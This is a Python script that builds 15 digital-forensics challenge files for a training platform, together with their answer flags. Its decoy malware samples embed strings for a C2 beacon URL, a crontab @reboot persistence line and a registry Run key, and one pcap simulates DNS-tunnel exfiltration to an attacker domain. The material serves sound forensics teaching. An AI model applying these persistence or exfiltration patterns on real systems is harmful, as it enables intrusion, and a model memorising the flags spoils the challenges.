#!/usr/bin/env python3
"""
Genera los 15 ficheros de evidencia de la categoria "Forense Digital" de HackLabs.

Se ejecuta UNA vez en un entorno de desarrollo (Kali u otra distro con las
herramientas listadas mas abajo) y su salida se commitea al repo en
evidence/forensic/ — no se regenera en runtime dentro del contenedor, porque
ninguno de estos labs depende de un secreto especifico de cada despliegue
(a diferencia del volcado NTDS dinamico de Active Directory).

Requisitos del sistema (solo para generar, NO se necesitan en el contenedor
de la app en runtime):
  - Python: scapy, Pillow
  - Binarios: exiftool, zip, mke2fs, debugfs, fls/icat (sleuthkit),
    gcc, x86_64-w64-mingw32-gcc

Uso:
    python3 ad_hoc/forensics/generate_evidence.py
"""
import os
import random
import struct
import subprocess
import sqlite3
import tempfile
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders

from PIL import Image, PngImagePlugin, ImageDraw
from scapy.all import IP, TCP, UDP, DNS, DNSQR, Raw, wrpcap

random.seed(1337)

HERE = os.path.dirname(os.path.abspath(__file__))
REPO_ROOT = os.path.abspath(os.path.join(HERE, '..', '..'))
OUT_DIR = os.path.join(REPO_ROOT, 'evidence', 'forensic')
os.makedirs(OUT_DIR, exist_ok=True)

# Fuente de verdad de las 15 flags — deben coincidir literalmente con
# get_lab_flag_map() en app.py.
FLAGS = {
    'df_file_signatures':   'HL{m4g1c_by73s_r3v34l_7h3_7ru7h}',
    'df_metadata_exif':     'HL{3x1f_g30l0c4710n_l34k4g3}',
    'df_steganography':     'HL{l5b_5t3g0_h1dd3n_1n_p1x3l5}',
    'df_archive_cracking':  'HL{z1p_p455w0rd_cr4ck3d_w17h_j0hn}',
    'df_email_analysis':    'HL{ph1sh1ng_h34d3r5_d0n7_l13}',
    'df_browser_artifacts': 'HL{br0ws3r_h1570ry_n3v3r_l135}',
    'df_log_analysis':      'HL{55h_bru73f0rc3_r3c0n57ruc73d}',
    'df_pcap_credentials':  'HL{pl41n73x7_f7p_cr3d5_5n1ff3d}',
    'df_pcap_exfiltration': 'HL{dn5_7unn3l_3xf1l7r4710n_c4u9h7}',
    'df_file_carving':      'HL{c4rv3d_fr0m_r4w_by73s}',
    'df_disk_timeline':     'HL{d3l3730_1n0d3_r3c0v3r3d}',
    'df_malware_strings':   'HL{57r1ng5_n3v3r_l13_4b0u7_m4lw4r3}',
    'df_pe_analysis':       'HL{p3_h34d3r5_3xp053_7h3_p4yl04d}',
    'df_memory_process':    'HL{m4l1c10u5_pr0c355_1n_r4m}',
    'df_memory_credentials':'HL{cr3d5_l1ng3r_1n_m3m0ry}',
}


def out(name):
    return os.path.join(OUT_DIR, name)


# ---------------------------------------------------------------------------
# DF 01 — File Signature Analysis: PNG real con extension .docx falsa
# ---------------------------------------------------------------------------
def gen_file_signatures():
    flag = FLAGS['df_file_signatures']
    img = Image.new('RGB', (300, 150), (24, 28, 38))
    d = ImageDraw.Draw(img)
    d.text((10, 10), 'Informe Confidencial Q3', fill=(200, 200, 200))
    d.text((10, 40), '(este fichero no es lo que parece)', fill=(120, 200, 160))
    info = PngImagePlugin.PngInfo()
    info.add_text('Comment', flag)
    info.add_text('Author', 'direccion@hacklabs-corp.com')
    path = out('Informe_Confidencial.docx')
    img.save(path, format='PNG', pnginfo=info)
    return path


# ---------------------------------------------------------------------------
# DF 02 — EXIF Metadata Analysis: JPEG con GPS + comentario via exiftool
# ---------------------------------------------------------------------------
def gen_metadata_exif():
    flag = FLAGS['df_metadata_exif']
    img = Image.new('RGB', (400, 300), (90, 130, 160))
    d = ImageDraw.Draw(img)
    d.text((10, 10), 'Team offsite - HackLabs Corp', fill=(255, 255, 255))
    path = out('team_offsite.jpg')
    img.save(path, format='JPEG', quality=90)
    subprocess.run([
        'exiftool', '-overwrite_original',
        '-GPSLatitude=40.4168', '-GPSLatitudeRef=N',
        '-GPSLongitude=-3.7038', '-GPSLongitudeRef=W',
        '-Software=HackLabsCam v2.1',
        '-Artist=j.martinez',
        f'-UserComment={flag}',
        path,
    ], check=True, capture_output=True)
    return path


# ---------------------------------------------------------------------------
# DF 03 — Esteganografia LSB en PNG
# ---------------------------------------------------------------------------
def _lsb_embed(img, message: bytes):
    payload = struct.pack('>I', len(message)) + message
    bits = ''.join(f'{b:08b}' for b in payload)
    pixels = list(img.getdata())
    if len(bits) > len(pixels) * 3:
        raise ValueError('imagen demasiado pequena para el mensaje')
    bit_idx = 0
    new_pixels = []
    for px in pixels:
        px = list(px[:3])
        for c in range(3):
            if bit_idx < len(bits):
                px[c] = (px[c] & 0xFE) | int(bits[bit_idx])
                bit_idx += 1
        new_pixels.append(tuple(px))
    img.putdata(new_pixels)
    return img


def gen_steganography():
    flag = FLAGS['df_steganography']
    img = Image.new('RGB', (250, 250))
    d = ImageDraw.Draw(img)
    for y in range(250):
        d.line([(0, y), (250, y)], fill=(30 + y // 3, 60, 120))
    d.text((20, 110), 'HackLabs // sunset.png', fill=(255, 255, 255))
    img = _lsb_embed(img, flag.encode())
    path = out('sunset.png')
    img.save(path, format='PNG')
    return path


# ---------------------------------------------------------------------------
# DF 04 — ZIP protegido con password de rockyou
# ---------------------------------------------------------------------------
def gen_archive_cracking():
    flag = FLAGS['df_archive_cracking']
    with tempfile.TemporaryDirectory() as tmp:
        txt_path = os.path.join(tmp, 'Informe_Financiero_Q3.txt')
        with open(txt_path, 'w') as f:
            f.write(
                'INFORME FINANCIERO — CONFIDENCIAL\n\n'
                'Este documento contiene proyecciones internas del Q3.\n'
                'No distribuir fuera del departamento financiero.\n\n'
                f'Codigo de verificacion interno: {flag}\n'
            )
        zip_path = out('Informe_Financiero_Q3.zip')
        if os.path.exists(zip_path):
            os.remove(zip_path)
        subprocess.run(
            ['zip', '-j', '-P', 'trustno1', zip_path, txt_path],
            check=True, capture_output=True,
        )
    return zip_path


# ---------------------------------------------------------------------------
# DF 05 — Email de phishing (.eml) con cabeceras spoofeadas + adjunto base64
# ---------------------------------------------------------------------------
def gen_email_analysis():
    flag = FLAGS['df_email_analysis']
    msg = MIMEMultipart()
    msg['From'] = 'Recursos Humanos <rrhh@hacklabs-corp.com>'
    msg['To'] = 'empleado@hacklabs-corp.com'
    msg['Subject'] = 'Actualizacion urgente de nomina - Accion requerida'
    msg['Date'] = 'Mon, 10 Aug 2026 09:14:02 +0200'
    msg['Message-ID'] = '<20260810091402.A1B2C3@mail-relay-77.attacker-infra.ru>'
    msg['Received'] = (
        'from mail-relay-77.attacker-infra.ru (unverified [185.220.101.42])\r\n'
        '  by mx1.hacklabs-corp.com with SMTP id 4Xy1Z; Mon, 10 Aug 2026 09:14:01 +0200'
    )
    msg['Authentication-Results'] = (
        'mx1.hacklabs-corp.com; spf=fail smtp.mailfrom=hacklabs-corp.com; '
        'dkim=none; dmarc=fail action=quarantine'
    )
    msg['Reply-To'] = 'soporte-nomina@hack1abs-corp.com'

    body = MIMEText(
        'Estimado empleado,\n\n'
        'Nuestro departamento ha detectado una incidencia en el calculo de su '
        'nomina de este mes. Adjuntamos el documento de verificacion con el '
        'codigo de referencia necesario para regularizar la situacion.\n\n'
        'Atentamente,\nRecursos Humanos',
        'plain', 'utf-8',
    )
    msg.attach(body)

    attach_content = (
        'DOCUMENTO DE VERIFICACION INTERNA\n\n'
        f'Codigo de referencia: {flag}\n\n'
        'Este documento confirma la identidad del solicitante ante el '
        'departamento de nominas.\n'
    ).encode('utf-8')
    part = MIMEBase('application', 'octet-stream')
    part.set_payload(attach_content)
    encoders.encode_base64(part)
    part.add_header('Content-Disposition', 'attachment; filename="verificacion_nomina.txt"')
    msg.attach(part)

    path = out('nomina_urgente.eml')
    with open(path, 'wb') as f:
        f.write(msg.as_bytes())
    return path


# ---------------------------------------------------------------------------
# DF 06 — Artefactos de navegador: historial SQLite con token filtrado
# ---------------------------------------------------------------------------
def gen_browser_artifacts():
    flag = FLAGS['df_browser_artifacts']
    path = out('history.sqlite')
    if os.path.exists(path):
        os.remove(path)
    conn = sqlite3.connect(path)
    cur = conn.cursor()
    cur.execute('''CREATE TABLE urls (
        id INTEGER PRIMARY KEY, url TEXT, title TEXT,
        visit_count INTEGER, last_visit_time INTEGER)''')
    cur.execute('''CREATE TABLE downloads (
        id INTEGER PRIMARY KEY, target_path TEXT, tab_url TEXT, start_time INTEGER)''')

    rows = [
        ('https://mail.hacklabs-corp.com/inbox', 'Bandeja de entrada', 42, 13380345600),
        ('https://intranet.hacklabs-corp.com/wiki/onboarding', 'Onboarding Wiki', 3, 13380345700),
        ('https://github.com/hacklabs-corp/internal-tools', 'internal-tools', 7, 13380345800),
        (f'https://hr-portal.hacklabs-corp.com/export/payroll?session=a92fd7c1&token={flag}',
         'Payroll Export', 1, 13380345900),
        ('https://calendar.hacklabs-corp.com/week', 'Calendario', 15, 13380346000),
        ('https://stackoverflow.com/questions/tagged/flask', 'flask questions', 5, 13380346100),
    ]
    cur.executemany('INSERT INTO urls (url, title, visit_count, last_visit_time) VALUES (?,?,?,?)', rows)
    cur.execute('INSERT INTO downloads (target_path, tab_url, start_time) VALUES (?,?,?)',
                ('C:\\Users\\jmartinez\\Downloads\\payroll_export.xlsx',
                 'https://hr-portal.hacklabs-corp.com/export/payroll', 13380345900))
    conn.commit()
    conn.close()
    return path


# ---------------------------------------------------------------------------
# DF 07 — Log de autenticacion: fuerza bruta SSH + comando post-explotacion
# ---------------------------------------------------------------------------
def gen_log_analysis():
    flag = FLAGS['df_log_analysis']
    attacker_ip = '198.51.100.77'
    users = ['root', 'admin', 'ubuntu', 'test', 'oracle', 'postgres', 'deploy',
             'jenkins', 'git', 'backup-svc', 'www-data', 'ftpuser']
    lines = []
    t_base = 180
    for i in range(48):
        u = random.choice(users)
        t = t_base + i * 2
        lines.append(f'Aug 10 03:{t // 60:02d}:{t % 60:02d} bastion sshd[2211]: '
                      f'Failed password for invalid user {u} from {attacker_ip} port {40000+i} ssh2')
    t = t_base + 48 * 2 + 4
    lines.append(f'Aug 10 03:{t // 60:02d}:{t % 60:02d} bastion sshd[2211]: '
                 f'Accepted password for backup-svc from {attacker_ip} port 51322 ssh2')
    t += 1
    lines.append(f'Aug 10 03:{t // 60:02d}:{t % 60:02d} bastion sshd[2211]: '
                 f'pam_unix(sshd:session): session opened for user backup-svc by (uid=0)')
    t += 18
    lines.append(f'Aug 10 03:{t // 60:02d}:{t % 60:02d} bastion audit[2211]: '
                 f'CMD="cat /srv/secrets/flag_df07.txt" cwd=/home/backup-svc uid=backup-svc')
    lines.append(f'Aug 10 03:{t // 60:02d}:{t % 60:02d} bastion audit[2211]: OUTPUT="{flag}"')
    t += 2
    lines.append(f'Aug 10 03:{t // 60:02d}:{t % 60:02d} bastion sshd[2211]: '
                 f'pam_unix(sshd:session): session closed for user backup-svc')

    path = out('auth.log')
    with open(path, 'w') as f:
        f.write('\n'.join(lines) + '\n')
    return path


# ---------------------------------------------------------------------------
# Helper compartido: conversacion TCP realista para los pcaps
# ---------------------------------------------------------------------------
def _tcp_conversation(src_ip, dst_ip, sport, dport, exchanges, start_time=0.0):
    pkts = []
    seq_c = random.randint(1_000_000, 4_000_000_000)
    seq_s = random.randint(1_000_000, 4_000_000_000)
    t = start_time

    def nt():
        nonlocal t
        t += random.uniform(0.01, 0.09)
        return t

    def add(pkt, ts):
        pkt.time = ts
        pkts.append(pkt)

    add(IP(src=src_ip, dst=dst_ip) / TCP(sport=sport, dport=dport, flags='S', seq=seq_c), nt())
    add(IP(src=dst_ip, dst=src_ip) / TCP(sport=dport, dport=sport, flags='SA', seq=seq_s, ack=seq_c + 1), nt())
    seq_c += 1
    add(IP(src=src_ip, dst=dst_ip) / TCP(sport=sport, dport=dport, flags='A', seq=seq_c, ack=seq_s + 1), nt())
    seq_s += 1

    for direction, payload in exchanges:
        if direction == 'C':
            add(IP(src=src_ip, dst=dst_ip) / TCP(sport=sport, dport=dport, flags='PA', seq=seq_c, ack=seq_s) / Raw(load=payload), nt())
            seq_c += len(payload)
            add(IP(src=dst_ip, dst=src_ip) / TCP(sport=dport, dport=sport, flags='A', seq=seq_s, ack=seq_c), nt())
        else:
            add(IP(src=dst_ip, dst=src_ip) / TCP(sport=dport, dport=sport, flags='PA', seq=seq_s, ack=seq_c) / Raw(load=payload), nt())
            seq_s += len(payload)
            add(IP(src=src_ip, dst=dst_ip) / TCP(sport=sport, dport=dport, flags='A', seq=seq_c, ack=seq_s), nt())

    add(IP(src=src_ip, dst=dst_ip) / TCP(sport=sport, dport=dport, flags='FA', seq=seq_c, ack=seq_s), nt())
    seq_c += 1
    add(IP(src=dst_ip, dst=src_ip) / TCP(sport=dport, dport=sport, flags='FA', seq=seq_s, ack=seq_c), nt())
    seq_s += 1
    add(IP(src=src_ip, dst=dst_ip) / TCP(sport=sport, dport=dport, flags='A', seq=seq_c, ack=seq_s), nt())
    return pkts


# ---------------------------------------------------------------------------
# DF 08 — PCAP con credenciales FTP en claro + flag servida por HTTP en claro
# ---------------------------------------------------------------------------
def gen_pcap_credentials():
    flag = FLAGS['df_pcap_credentials']
    client_ip, ftp_ip, http_ip = '10.10.14.22', '10.10.10.5', '10.10.10.5'

    ftp_exchanges = [
        ('S', b'220 (vsFTPd 3.0.3)\r\n'),
        ('C', b'USER contractor\r\n'),
        ('S', b'331 Please specify the password.\r\n'),
        ('C', b'PASS Bu1ld3r2024\r\n'),
        ('S', b'230 Login successful.\r\n'),
        ('C', b'SYST\r\n'),
        ('S', b'215 UNIX Type: L8\r\n'),
        ('C', b'PWD\r\n'),
        ('S', b'257 "/" is the current directory\r\n'),
        ('C', b'RETR readme.txt\r\n'),
        ('S', b'150 Opening BINARY mode data connection for readme.txt (94 bytes).\r\n'),
        ('S', b'226 Transfer complete.\r\n'),
    ]
    pkts = _tcp_conversation(client_ip, ftp_ip, 51322, 21, ftp_exchanges, start_time=0.0)

    body = (f'Nota interna: revisar credenciales rotadas la semana que viene.\n'
             f'Codigo de verificacion: {flag}\n').encode()
    http_req = (b'GET /internal/notes.txt HTTP/1.1\r\n'
                b'Host: intranet.hacklabs.local\r\n'
                b'User-Agent: curl/7.88.1\r\n'
                b'Accept: */*\r\n\r\n')
    http_resp = (b'HTTP/1.1 200 OK\r\n'
                 b'Server: SimpleHTTP/0.6 Python/3.11\r\n'
                 b'Content-Type: text/plain\r\n'
                 b'Content-Length: ' + str(len(body)).encode() + b'\r\n\r\n' + body)
    http_exchanges = [('C', http_req), ('S', http_resp)]
    pkts += _tcp_conversation(client_ip, http_ip, 51410, 80, http_exchanges, start_time=3.0)

    path = out('captura_trafico.pcap')
    wrpcap(path, pkts)
    return path


# ---------------------------------------------------------------------------
# DF 09 — PCAP con exfiltracion de datos vía DNS tunneling
# ---------------------------------------------------------------------------
def gen_pcap_exfiltration():
    flag = FLAGS['df_pcap_exfiltration']
    client_ip, dns_ip = '10.10.14.22', '8.8.8.8'
    flag_hex = flag.encode().hex()
    chunk_size = 12
    chunks = [flag_hex[i:i + chunk_size] for i in range(0, len(flag_hex), chunk_size)]

    pkts = []
    t = 0.0
    for i, chunk in enumerate(chunks):
        t += random.uniform(0.3, 0.9)
        qname = f'{i:02d}-{chunk}.exfil.attacker-c2.net'
        sport = random.randint(40000, 60000)
        q = IP(src=client_ip, dst=dns_ip) / UDP(sport=sport, dport=53) / \
            DNS(id=0x1000 + i, rd=1, qd=DNSQR(qname=qname, qtype='TXT'))
        q.time = t
        pkts.append(q)
        t += 0.05
        r = IP(src=dns_ip, dst=client_ip) / UDP(sport=53, dport=sport) / \
            DNS(id=0x1000 + i, qr=1, rcode=3, qd=DNSQR(qname=qname, qtype='TXT'))
        r.time = t
        pkts.append(r)

    path = out('dns_traffic.pcap')
    wrpcap(path, pkts)
    return path


# ---------------------------------------------------------------------------
# DF 10 — File carving: PNG embebido en un volcado de bytes sin asignar
# ---------------------------------------------------------------------------
def gen_file_carving():
    flag = FLAGS['df_file_carving']
    img = Image.new('RGB', (180, 90), (20, 40, 20))
    d = ImageDraw.Draw(img)
    d.text((5, 5), 'recovered_evidence.png', fill=(200, 255, 200))
    info = PngImagePlugin.PngInfo()
    info.add_text('Comment', flag)
    tmp_png = out('_tmp_carving_source.png')
    img.save(tmp_png, format='PNG', pnginfo=info)
    with open(tmp_png, 'rb') as f:
        png_bytes = f.read()
    os.remove(tmp_png)

    random.seed(4242)
    junk_before = bytes(random.randint(0, 255) for _ in range(65536))
    junk_after = bytes(random.randint(0, 255) for _ in range(131072))
    random.seed(1337)

    path = out('unallocated_cluster_dump.dd')
    with open(path, 'wb') as f:
        f.write(junk_before)
        f.write(png_bytes)
        f.write(junk_after)
    return path


# ---------------------------------------------------------------------------
# DF 11 — Timeline de disco: imagen ext4 real con fichero borrado recuperable
# ---------------------------------------------------------------------------
def gen_disk_timeline():
    flag = FLAGS['df_disk_timeline']
    path = out('workstation_image.dd')
    if os.path.exists(path):
        os.remove(path)
    subprocess.run(['dd', 'if=/dev/zero', f'of={path}', 'bs=1M', 'count=16', 'status=none'], check=True)
    subprocess.run(['mke2fs', '-F', '-q', '-b', '1024', path], check=True, capture_output=True)

    with tempfile.TemporaryDirectory() as tmp:
        notas = os.path.join(tmp, 'notas.txt')
        with open(notas, 'w') as f:
            f.write('Notas de la reunion semanal. Nada relevante.\n')
        backup = os.path.join(tmp, 'backup_old.zip')
        with open(backup, 'wb') as f:
            f.write(b'PK\x05\x06' + b'\x00' * 18)
        informe = os.path.join(tmp, 'informe_RRHH.txt')
        with open(informe, 'w') as f:
            f.write('INFORME RRHH — BORRADO INTENCIONADAMENTE\n\n'
                     f'Codigo de verificacion: {flag}\n')

        subprocess.run(['debugfs', '-w', '-R', f'write {notas} notas.txt', path], check=True, capture_output=True)
        subprocess.run(['debugfs', '-w', '-R', f'write {backup} backup_old.zip', path], check=True, capture_output=True)
        subprocess.run(['debugfs', '-w', '-R', f'write {informe} informe_RRHH.txt', path], check=True, capture_output=True)
        subprocess.run(['debugfs', '-w', '-R', 'rm informe_RRHH.txt', path], check=True, capture_output=True)

    return path


# ---------------------------------------------------------------------------
# DF 12 — Triage de malware: binario ELF señuelo con strings sospechosas
# ---------------------------------------------------------------------------
def gen_malware_strings():
    flag = FLAGS['df_malware_strings']
    with tempfile.TemporaryDirectory() as tmp:
        c_path = os.path.join(tmp, 'sample.c')
        with open(c_path, 'w') as f:
            f.write(f'''#include <stdio.h>
static const char *c2_endpoint = "http://45.33.12.87:4444/beacon";
static const char *persistence = "(crontab -l 2>/dev/null; echo '@reboot /tmp/.hidden/update.sh') | crontab -";
static const char *marker = "{flag}";
static const char *note = "internal build id — do not ship";
int main(void) {{
    printf("System integrity check: OK\\n");
    return 0;
}}
''')
        elf_path = out('svc_update_x64')
        subprocess.run(['gcc', '-O0', '-o', elf_path, c_path], check=True, capture_output=True)
    return elf_path


# ---------------------------------------------------------------------------
# DF 13 — Analisis de cabeceras PE: ejecutable Windows disfrazado de factura
# ---------------------------------------------------------------------------
def gen_pe_analysis():
    flag = FLAGS['df_pe_analysis']
    with tempfile.TemporaryDirectory() as tmp:
        c_path = os.path.join(tmp, 'invoice.c')
        with open(c_path, 'w') as f:
            f.write(f'''#include <stdio.h>
static const char *reg_persist = "SOFTWARE\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run\\\\InvoiceHelper";
static const char *c2 = "https://update-cdn.attacker-infra.ru/beacon.php";
static const char *marker = "{flag}";
int main(void) {{
    printf("Invoice viewer — nothing to see here\\n");
    return 0;
}}
''')
        exe_path = out('Factura_Pendiente.exe')
        subprocess.run(['x86_64-w64-mingw32-gcc', '-O0', '-o', exe_path, c_path], check=True, capture_output=True)
    return exe_path


# ---------------------------------------------------------------------------
# DF 14 / DF 15 — "Volcados de memoria" reducidos, orientados a strings/grep
# ---------------------------------------------------------------------------
def _memory_blob(records):
    random.seed(9001)
    chunks = []
    for rec in records:
        chunks.append(bytes(random.randint(0, 255) for _ in range(random.randint(400, 1400))))
        chunks.append(rec.encode() + b'\n')
    chunks.append(bytes(random.randint(0, 255) for _ in range(random.randint(2000, 5000))))
    random.seed(1337)
    return b''.join(chunks)


def gen_memory_process():
    flag = FLAGS['df_memory_process']
    procs = [
        'PROC_ENTRY|PID:812|PPID:4|IMAGE:csrss.exe|PATH:C:\\Windows\\System32\\csrss.exe|CMD:csrss.exe',
        'PROC_ENTRY|PID:1044|PPID:812|IMAGE:explorer.exe|PATH:C:\\Windows\\explorer.exe|CMD:C:\\Windows\\explorer.exe',
        'PROC_ENTRY|PID:2210|PPID:1044|IMAGE:chrome.exe|PATH:C:\\Program Files\\Google\\Chrome\\chrome.exe|CMD:chrome.exe --profile-directory=Default',
        'PROC_ENTRY|PID:2288|PPID:1044|IMAGE:OUTLOOK.EXE|PATH:C:\\Program Files\\Microsoft Office\\root\\Office16\\OUTLOOK.EXE|CMD:OUTLOOK.EXE',
        'PROC_ENTRY|PID:3120|PPID:1044|IMAGE:Teams.exe|PATH:C:\\Users\\jmartinez\\AppData\\Local\\Microsoft\\Teams\\Teams.exe|CMD:Teams.exe',
        ('PROC_ENTRY|PID:4821|PPID:668|IMAGE:svchost32.exe|PATH:C:\\Users\\Public\\svchost32.exe|'
         f'CMD:svchost32.exe -connect 45.33.12.87:4444 -k\nFLAG_MARKER:{flag}'),
        'PROC_ENTRY|PID:5502|PPID:1044|IMAGE:OneDrive.exe|PATH:C:\\Users\\jmartinez\\AppData\\Local\\Microsoft\\OneDrive\\OneDrive.exe|CMD:OneDrive.exe /background',
    ]
    data = _memory_blob(procs)
    path = out('memdump_workstation01.raw')
    with open(path, 'wb') as f:
        f.write(data)
    return path


def gen_memory_credentials():
    flag = FLAGS['df_memory_credentials']
    creds = [
        'CRED_CACHE|APP:chrome.exe|USER:j.martinez@hacklabs-corp.com|SITE:intranet.hacklabs-corp.com|SAVED:1',
        'CRED_CACHE|APP:Teams.exe|TOKEN:eyJhbGciOiJIUzI1NiJ9.redacted.token',
        ('CRED_CACHE|APP:OUTLOOK.EXE|USER:m.director|PASS:Sup3rS3cr3t!|DOMAIN:HACKLABS-CORP\n'
         f'FLAG_MARKER:{flag}'),
        'CRED_CACHE|APP:chrome.exe|USER:backup-svc|SITE:backup-portal.hacklabs-corp.com|SAVED:1',
    ]
    data = _memory_blob(creds)
    path = out('memdump_workstation01_lsass.raw')
    with open(path, 'wb') as f:
        f.write(data)
    return path


GENERATORS = [
    ('DF01 file_signatures', gen_file_signatures),
    ('DF02 metadata_exif', gen_metadata_exif),
    ('DF03 steganography', gen_steganography),
    ('DF04 archive_cracking', gen_archive_cracking),
    ('DF05 email_analysis', gen_email_analysis),
    ('DF06 browser_artifacts', gen_browser_artifacts),
    ('DF07 log_analysis', gen_log_analysis),
    ('DF08 pcap_credentials', gen_pcap_credentials),
    ('DF09 pcap_exfiltration', gen_pcap_exfiltration),
    ('DF10 file_carving', gen_file_carving),
    ('DF11 disk_timeline', gen_disk_timeline),
    ('DF12 malware_strings', gen_malware_strings),
    ('DF13 pe_analysis', gen_pe_analysis),
    ('DF14 memory_process', gen_memory_process),
    ('DF15 memory_credentials', gen_memory_credentials),
]


def main():
    print(f'Generando evidencia en {OUT_DIR}\n')
    for label, fn in GENERATORS:
        p = fn()
        size = os.path.getsize(p)
        print(f'  [{label:24s}] {os.path.basename(p):32s} {size:>10,} bytes')
    print('\nListo. Revisa evidence/forensic/ y commitea los ficheros generados.')


if __name__ == '__main__':
    main()
